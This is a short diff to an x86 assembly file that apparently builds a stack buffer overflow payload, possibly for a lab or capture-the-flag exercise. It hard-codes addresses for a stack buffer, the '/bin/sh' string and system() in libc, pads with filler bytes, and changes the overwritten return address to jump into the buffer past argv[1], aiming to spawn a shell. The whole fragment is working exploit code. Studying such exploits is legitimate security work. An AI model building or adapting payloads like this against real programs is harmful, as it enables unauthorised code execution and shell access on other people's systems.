@@ -1,6 +1,6 @@
         .intel_syntax noprefix
 
-        .set stack_buffer, 0xbfffffbf
+        .set stack_buffer, 0xbffffd40
         .set binsh,        0xb7f8cc58 # "/bin/sh" in libc
         .set libc_system,  0xb7e6b060 # system(3) in libc
 
@@ -16,4 +16,4 @@ shellcode_end:
         .byte 0x42
         .endr
 
-        .int stack_buffer
+        .int stack_buffer + 40 # skip argv[1]
